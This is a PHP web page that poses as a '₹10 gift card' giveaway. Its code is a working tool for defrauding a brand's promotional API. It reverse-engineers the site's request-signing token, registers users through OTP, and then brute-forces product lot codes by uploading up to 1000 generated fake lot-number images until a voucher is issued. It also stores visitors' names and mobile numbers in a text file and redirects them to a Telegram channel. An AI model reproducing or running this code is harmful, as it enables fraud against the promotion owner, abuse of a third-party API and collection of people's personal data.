<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Chandu Viral</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #ffffff 0%, #f8f9ff 25%, #e6e6fa 50%, #9370db 75%, #8a2be2 100%);
            background-size: 400% 400%;
            animation: gradientShift 8s ease infinite;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow-x: hidden;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .container {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 400px;
        }
        
        .header-section {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .main-title {
            font-size: 2.5rem;
            font-weight: 900;
            color: #8a2be2;
            text-align: center;
            margin-bottom: 15px;
            text-shadow: 0 4px 15px rgba(138, 43, 226, 0.3);
            letter-spacing: -0.02em;
            position: relative;
            background: linear-gradient(45deg, #8a2be2, #9370db, #8a2be2);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: purpleShimmer 3s ease-in-out infinite;
        }
        
        @keyframes purpleShimmer {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .card {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(138, 43, 226, 0.2);
            border-radius: 25px;
            box-shadow: 
                0 25px 45px rgba(138, 43, 226, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
            padding: 35px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(138, 43, 226, 0.1), transparent);
            transition: left 0.8s ease;
        }
        
        .card:hover::before {
            left: 100%;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 
                0 35px 60px rgba(138, 43, 226, 0.15),
                inset 0 1px 0 rgba(255, 255, 255, 0.9);
        }
        
        .form-title {
            font-size: 1.4rem;
            font-weight: 700;
            color: #8a2be2;
            margin-bottom: 25px;
            text-align: center;
            text-shadow: 0 2px 10px rgba(138, 43, 226, 0.2);
        }
        
        .form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .input-group {
            position: relative;
        }
        
        .label {
            font-size: 0.9rem;
            font-weight: 600;
            color: #6a4c93;
            margin-bottom: 8px;
            display: block;
        }
        
        .input {
            width: 100%;
            height: 50px;
            padding: 0 18px;
            border: 2px solid rgba(138, 43, 226, 0.2);
            border-radius: 15px;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.8);
            color: #4a4a4a;
            backdrop-filter: blur(10px);
        }
        
        .input:focus {
            border-color: #8a2be2;
            box-shadow: 
                0 0 0 3px rgba(138, 43, 226, 0.2),
                0 5px 15px rgba(138, 43, 226, 0.1);
            background: rgba(255, 255, 255, 0.95);
            transform: translateY(-2px);
        }
        
        .input::placeholder {
            color: rgba(106, 76, 147, 0.6);
            font-size: 0.9rem;
        }
        
        .submit-btn {
            width: 100%;
            height: 55px;
            background: linear-gradient(135deg, #8a2be2 0%, #9370db 50%, #8a2be2 100%);
            background-size: 200% 200%;
            color: white;
            font-weight: 800;
            font-size: 1.1rem;
            border: none;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 8px 25px rgba(138, 43, 226, 0.3);
            animation: buttonGlow 2s ease-in-out infinite alternate;
        }
        
        @keyframes buttonGlow {
            0% { 
                background-position: 0% 50%;
                box-shadow: 0 8px 25px rgba(138, 43, 226, 0.3);
            }
            100% { 
                background-position: 100% 50%;
                box-shadow: 0 8px 35px rgba(138, 43, 226, 0.5);
            }
        }
        
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 35px rgba(138, 43, 226, 0.4);
        }
        
        .submit-btn:active {
            transform: translateY(-1px);
        }
        
        .status-container {
            margin: 20px 0;
            padding: 18px 22px;
            border-radius: 15px;
            text-align: center;
            font-weight: 600;
            font-size: 0.95rem;
            position: relative;
            backdrop-filter: blur(15px);
            animation: statusSlide 0.4s ease;
            border: 1px solid rgba(138, 43, 226, 0.2);
        }
        
        @keyframes statusSlide {
            from {
                opacity: 0;
                transform: translateY(-15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .status-success {
            background: rgba(72, 187, 120, 0.1);
            color: #38a169;
            border-color: rgba(72, 187, 120, 0.3);
            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.1);
        }
        
        .status-error {
            background: rgba(245, 101, 101, 0.1);
            color: #e53e3e;
            border-color: rgba(245, 101, 101, 0.3);
            box-shadow: 0 8px 25px rgba(245, 101, 101, 0.1);
        }
        
        .status-info {
            background: rgba(66, 153, 225, 0.1);
            color: #3182ce;
            border-color: rgba(66, 153, 225, 0.3);
            box-shadow: 0 8px 25px rgba(66, 153, 225, 0.1);
        }
        
        .success {
            background: linear-gradient(135deg, rgba(72, 187, 120, 0.2), rgba(56, 161, 105, 0.2));
            backdrop-filter: blur(15px);
            border: 1px solid rgba(72, 187, 120, 0.4);
            color: #38a169;
            padding: 25px;
            border-radius: 20px;
            text-align: center;
            font-weight: 700;
            font-size: 1.1rem;
            margin: 20px 0;
            box-shadow: 0 15px 40px rgba(72, 187, 120, 0.2);
            animation: successBounce 0.8s ease;
            position: relative;
            overflow: hidden;
        }
        
        .success::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 0%, transparent 70%);
            animation: successShimmer 3s infinite;
        }
        
        @keyframes successBounce {
            0% {
                transform: scale(0.8);
                opacity: 0;
            }
            50% {
                transform: scale(1.05);
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        @keyframes successShimmer {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .generating-msg {
            background: linear-gradient(135deg, rgba(138, 43, 226, 0.2), rgba(147, 112, 219, 0.2));
            backdrop-filter: blur(15px);
            border: 1px solid rgba(138, 43, 226, 0.4);
            color: #8a2be2;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            margin: 20px 0;
            font-weight: 600;
            font-size: 1rem;
            box-shadow: 0 10px 30px rgba(138, 43, 226, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .generating-msg::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            animation: processingSlide 2s infinite;
        }
        
        @keyframes processingSlide {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .step-indicator {
            display: flex;
            justify-content: center;
            margin-bottom: 25px;
            gap: 15px;
        }
        
        .step {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            background-color: rgba(138, 43, 226, 0.2);
            transition: all 0.4s ease;
            position: relative;
            border: 2px solid rgba(138, 43, 226, 0.3);
        }
        
        .step.active {
            background: linear-gradient(135deg, #8a2be2, #9370db);
            border-color: #8a2be2;
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.6);
            transform: scale(1.3);
        }
        
        .step.active::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 6px;
            height: 6px;
            background: white;
            border-radius: 50%;
        }
        
        .divider {
            margin: 25px 0;
            text-align: center;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(138, 43, 226, 0.3), transparent);
        }
        
        .divider span {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            padding: 8px 18px;
            color: #8a2be2;
            font-size: 0.85rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-radius: 20px;
            border: 1px solid rgba(138, 43, 226, 0.3);
        }
        
        .claim-status {
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(138, 43, 226, 0.3);
            border-radius: 20px;
            padding: 15px 25px;
            color: #8a2be2;
            font-size: 1.1rem;
            font-weight: 700;
            display: inline-block;
            margin-top: 20px;
            box-shadow: 0 8px 25px rgba(138, 43, 226, 0.1);
            text-align: center;
            min-width: 200px;
        }
        
        .claim-counter {
            color: #9370db;
            font-weight: 800;
            font-size: 1.2rem;
        }
        
        .hidden-inputs {
            display: none;
        }
        
        /* Floating orbs animation */
        .orbs {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .orb {
            position: absolute;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(138, 43, 226, 0.2), rgba(138, 43, 226, 0.05));
            animation: orbFloat 8s infinite ease-in-out;
        }
        
        .orb:nth-child(1) { 
            width: 60px; height: 60px; 
            left: 10%; top: 20%; 
            animation-delay: 0s; 
        }
        .orb:nth-child(2) { 
            width: 40px; height: 40px; 
            left: 80%; top: 30%; 
            animation-delay: 2s; 
        }
        .orb:nth-child(3) { 
            width: 80px; height: 80px; 
            left: 60%; top: 70%; 
            animation-delay: 4s; 
        }
        .orb:nth-child(4) { 
            width: 30px; height: 30px; 
            left: 20%; top: 80%; 
            animation-delay: 6s; 
        }
        
        @keyframes orbFloat {
            0%, 100% {
                transform: translateY(0px) rotate(0deg);
                opacity: 0.7;
            }
            50% {
                transform: translateY(-20px) rotate(180deg);
                opacity: 1;
            }
        }
        
        .status-section {
            text-align: center;
            margin-top: 20px;
        }
        
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .container {
                max-width: 350px;
            }
            
            .main-title {
                font-size: 2rem;
                margin-bottom: 12px;
            }
            
            .card {
                padding: 25px;
                border-radius: 20px;
            }
            
            .form-title {
                font-size: 1.2rem;
                margin-bottom: 20px;
            }
            
            .input {
                height: 46px;
                font-size: 0.95rem;
            }
            
            .submit-btn {
                height: 50px;
                font-size: 1rem;
            }
            
            .claim-status {
                font-size: 1rem;
                padding: 12px 20px;
                min-width: 180px;
            }
            
            .claim-counter {
                font-size: 1.1rem;
            }
        }
        
        @media (max-width: 360px) {
            .container {
                max-width: 320px;
            }
            
            .main-title {
                font-size: 1.8rem;
            }
            
            .card {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Floating Orbs -->
    <div class="orbs">
        <div class="orb"></div>
        <div class="orb"></div>
        <div class="orb"></div>
        <div class="orb"></div>
    </div>

    <div class="container">
        <div class="header-section">
            <h1 class="main-title">₹10 GIFT CARD</h1>
        </div>
        
        <div class="card">
            <?php
            while (ob_get_level()) ob_end_flush();
            ob_implicit_flush(true);
            header("Content-Type: text/html; charset=UTF-8");

            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                if (isset($_POST['get_unique'])) {
                    $userKey = $_POST['userKey'] ?? null;
                    $dataKey = $_POST['dataKey'] ?? null;
                    $jwtToken = $_POST['jwtToken'] ?? null;
                    
                    if (!$userKey || !$dataKey || !$jwtToken) {
                        echo '<div class="status-container status-error">❌ Missing values for unique code upload.</div>';
                        exit;
                    }
                    
                    bruteForceUpload($userKey, $dataKey, $jwtToken);
                    exit;
                }
                
                if (isset($_POST['otp'])) {
                    $otp = trim($_POST['otp'] ?? '');
                    $userKey = $_POST['userKey'] ?? null;
                    $dataKey = $_POST['dataKey'] ?? null;
                    
                    if (!$otp || !$userKey || !$dataKey) {
                        echo '<div class="status-container status-error">❌ Missing OTP or required values.</div>';
                        exit;
                    }
                    
                    $verifyResult = verifyOTP($userKey, $dataKey, $otp);
                    if ($verifyResult && isset($verifyResult['token'])) {
                        $jwtToken = $verifyResult['token'];
                        echo '<div class="status-container status-success">OTP Verified Successfully</div>';
                        echo '<div class="divider"><span>Final Step</span></div>';
                        echo '<form method="post" class="form">
                                <div class="hidden-inputs">
                                    <input type="hidden" name="userKey" value="'.$userKey.'">
                                    <input type="hidden" name="dataKey" value="'.$dataKey.'">
                                    <input type="hidden" name="jwtToken" value="'.$jwtToken.'">
                                </div>
                                <button name="get_unique" value="1" type="submit" class="submit-btn">🎁 Get Gift Card</button>
                              </form>';
                        exit;
                    } else {
                        echo '<div class="status-container status-error">❌ Invalid OTP. Please try again.</div>';
                        exit;
                    }
                }
                
                if (isset($_POST['name']) && isset($_POST['mobile'])) {
                    $name = trim($_POST['name'] ?? '');
                    $mobile = trim($_POST['mobile'] ?? '');
                    
                    if (!$name || !$mobile) {
                        echo '<div class="status-container status-error">❌ Please enter both name and mobile number.</div>';
                        exit;
                    }
                    
                    list($userKey, $dataKey) = createNewUser();
                    $otpSuccess = registerNewUser($userKey, $dataKey, $name, $mobile);
                    
                    if ($otpSuccess) {
                        echo '<div class="step-indicator">
                                <div class="step active"></div>
                                <div class="step active"></div>
                                <div class="step"></div>
                              </div>';
                        echo '<h2 class="form-title">🔐 Verify OTP</h2>';
                        echo '<form method="post" class="form">
                                <div class="hidden-inputs">
                                    <input type="hidden" name="userKey" value="'.$userKey.'">
                                    <input type="hidden" name="dataKey" value="'.$dataKey.'">
                                </div>
                                <div class="input-group">
                                    <label class="label">📱 Enter OTP Code</label>
                                    <input type="text" name="otp" class="input" placeholder="Enter 6-digit OTP" required maxlength="6" autocomplete="one-time-code">
                                </div>
                                <button type="submit" class="submit-btn">Verify OTP</button>
                              </form>';
                    } else {
                        exit;
                    }
                }
            } else {
                echo '<div class="step-indicator">
                        <div class="step active"></div>
                        <div class="step"></div>
                        <div class="step"></div>
                      </div>';
                echo '<h2 class="form-title">📝 Enter Your Details</h2>';
                echo '<form method="post" class="form">
                        <div class="input-group">
                            <label class="label">👤 Full Name</label>
                            <input type="text" name="name" class="input" placeholder="Enter your full name" required autocomplete="name">
                        </div>
                        <div class="input-group">
                            <label class="label">📞 Mobile Number</label>
                            <input type="tel" name="mobile" class="input" placeholder="Enter your mobile number" required autocomplete="tel">
                        </div>
                        <button type="submit" class="submit-btn">Send OTP</button>
                      </form>';
            }

            // Function to get current claim count from file
            function getClaimCount() {
                $filename = 'claimed_gifts.txt';
                if (file_exists($filename)) {
                    $content = file_get_contents($filename);
                    $lines = explode("\n", trim($content));
                    return count(array_filter($lines)); // Count non-empty lines
                }
                return 0;
            }

            // Function to save claim to file
            function saveClaimToFile($userKey, $mobile = '', $name = '') {
                $filename = 'claimed_gifts.txt';
                $timestamp = date('Y-m-d H:i:s');
                $claimData = "[$timestamp] UserKey: $userKey | Mobile: $mobile | Name: $name\n";
                
                // Append to file
                file_put_contents($filename, $claimData, FILE_APPEND | LOCK_EX);
            }

            function createNewUser() {
                $url = "https://britannianutrichoice.com/api/users";
                $headers = [
                    "Accept: application/json",
                    "Content-Type: application/json",
                    "Origin: https://britannianutrichoice.com",
                ];
                $postData = [
                    "utm_source" => "qrcode",
                    "utm_medium" => "packsScan",
                    "utm_campaign" => "Nutridigestive"
                ];
                
                $ch = curl_init($url);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_HTTPHEADER => $headers,
                    CURLOPT_POSTFIELDS => json_encode($postData),
                ]);
                
                $response = curl_exec($ch);
                curl_close($ch);
                
                $json = json_decode($response, true);
                $decoded = json_decode(base64_decode($json["resp"]), true);
                
                return [$decoded["userKey"], $decoded["dataKey"]];
            }

            function registerNewUser($userKey, $dataKey, $name, $mobile) {
                $t = round(microtime(true) * 1000);
                $payload = [
                    "name" => $name,
                    "mobile" => $mobile,
                    "agree1" => true,
                    "userKey" => $userKey,
                    "t" => $t
                ];
                
                $token = buildNutriToken(json_encode($payload), $dataKey, $t);
                $post = http_build_query([
                    "userKey" => $userKey,
                    "data" => $token
                ]);
                
                $ch = curl_init("https://britannianutrichoice.com/api/users/register/$userKey?t=$t");
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $post,
                ]);
                
                $res = curl_exec($ch);
                curl_close($ch);
                
                $decoded = json_decode(base64_decode(json_decode($res, true)["resp"]), true);
                
                // Check if status code is 200 and show clean success message
                if (($decoded["statusCode"] ?? 0) === 200) {
                    echo '<div class="status-container status-success">OTP Send Success</div>';
                } else {
                    // Show error or other status messages
                    echo '<div class="status-container status-error">❌ Failed to send OTP. Please try again.</div>';
                }
                
                return ($decoded["statusCode"] ?? 0) === 200;
            }

            function verifyOTP($userKey, $dataKey, $otp) {
                $t = round(microtime(true) * 1000);
                $payload = [
                    "otp" => $otp,
                    "userKey" => $userKey,
                    "t" => $t
                ];
                
                $token = buildNutriToken(json_encode($payload), $dataKey, $t);
                $post = http_build_query([
                    "userKey" => $userKey,
                    "data" => $token
                ]);
                
                $ch = curl_init("https://britannianutrichoice.com/api/users/verifyOTP/$userKey?t=$t");
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $post,
                ]);
                
                $res = curl_exec($ch);
                curl_close($ch);
                
                $decoded = json_decode(base64_decode(json_decode($res, true)["resp"]), true);
                json_encode($decoded);
                
                if (($decoded["statusCode"] ?? 0) === 200) {
                    return [
                        "token" => $decoded["token"] ?? null,
                        "decoded" => $decoded
                    ];
                } else {
                    return false;
                }
            }

            function bruteForceUpload($userKey, $dataKey, $jwtToken) {
                echo str_repeat(" ", 4096);
                $maxAttempts = 1000;
                $attempts = 0;
                $printedWait = false;
                
                while (true) {
                    if (!$printedWait) {
                        echo '<div id="generatingMsg" class="generating-msg">🔄 Processing...</div>';
                        flush();
                        $printedWait = true;
                    }
                    
                    $rand = str_pad(mt_rand(0, 99999), 5, '0', STR_PAD_LEFT);
                    $lotCode = "284106021{$rand}P1";
                    
                    // Generate JPG file
                    $filename = generateImageFile("LOT NO.     $lotCode", $lotCode);
                    
                    $t = round(microtime(true) * 1000);
                    $dataToken = buildNutriToken(json_encode([
                        "userKey" => $userKey,
                        "t" => $t
                    ]), $dataKey, $t);
                    
                    $postFields = [
                        "media" => curl_file_create($filename, "image/jpeg", "lot.jpg"),
                        "data" => $dataToken,
                        "userKey" => $userKey
                    ];
                    
                    $url = "https://britannianutrichoice.com/api/users/getUniqueCode/$userKey?t=$t";
                    $ch = curl_init($url);
                    curl_setopt_array($ch, [
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_POST => true,
                        CURLOPT_POSTFIELDS => $postFields,
                        CURLOPT_HTTPHEADER => [
                            "Authorization: Bearer $jwtToken"
                        ],
                    ]);
                    
                    $res = curl_exec($ch);
                    curl_close($ch);
                    unlink($filename);
                    
                    $decoded = json_decode(base64_decode(json_decode($res, true)["resp"]), true);
                    
                    if (($decoded["statusCode"] ?? 0) == 200) {
                        echo "<script>document.getElementById('generatingMsg')?.remove();</script>";
                        
                        // Save claim to file
                        saveClaimToFile($userKey, $_POST['mobile'] ?? '', $_POST['name'] ?? '');
                        
                        echo '<div class="success">🎊 Congratulations!! You have Won ₹10 PhonePe Voucher<br>📱 You Will Received Gift Card Code In SMS</div>';
                        echo '<script>
                                // Redirect to Telegram after 3 seconds
                                setTimeout(function() {
                                    window.location.href = "https://t.me/chanduviral";
                                }, 3000);
                              </script>';
                        flush();
                        break;
                    }
                    
                    $attempts++;
                    if ($attempts >= $maxAttempts) {
                        echo "<script>document.getElementById('generatingMsg')?.remove();</script>";
                        echo '<div class="status-container status-error">❌ Gift Card generation failed. Please try again.</div>';
                        flush();
                        break;
                    }
                }
            }

            function generateImageFile($text, $code) {
                $img = imagecreatetruecolor(300, 80);
                $white = imagecolorallocate($img, 255, 255, 255);
                $black = imagecolorallocate($img, 0, 0, 0);
                
                imagefilledrectangle($img, 0, 0, 300, 80, $white);
                imagestring($img, 5, 10, 30, $text, $black);
                
                $tmpFile = tempnam(sys_get_temp_dir(), 'lot_img_');
                $tmpFileJpg = $tmpFile . '.jpg';
                imagejpeg($img, $tmpFileJpg, 90);
                imagedestroy($img);
                
                return $tmpFileJpg;
            }

            function buildNutriToken($jsonPayload, $dataKey, $timestamp) {
                $timeBase64 = base64_encode((string)$timestamp);
                $payloadBase64 = base64_encode($jsonPayload);
                $signInput = $timeBase64 . "." . $payloadBase64;
                $hmacKey = substr($dataKey, 4, 14);
                $hmacRaw = hash_hmac('sha256', $signInput, $hmacKey, true);
                $hmacHex = bin2hex($hmacRaw);
                $hmacBase64 = base64_encode($hmacHex);
                $t = 3;
                $fu = substr($hmacBase64, 0, $t);
                $y = substr($hmacBase64, $t);
                $prefix = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 8)), 0, 8);
                $encPart = "8" . $t . $fu . $prefix . $y;
                
                return $timeBase64 . "." . $payloadBase64 . "." . $encPart;
            }
            ?>
        </div>
        
        <div class="status-section">
            <div class="claim-status">
                Success - <span class="claim-counter"><?php echo getClaimCount(); ?></span>
            </div>
        </div>
    </div>
</body>
</html>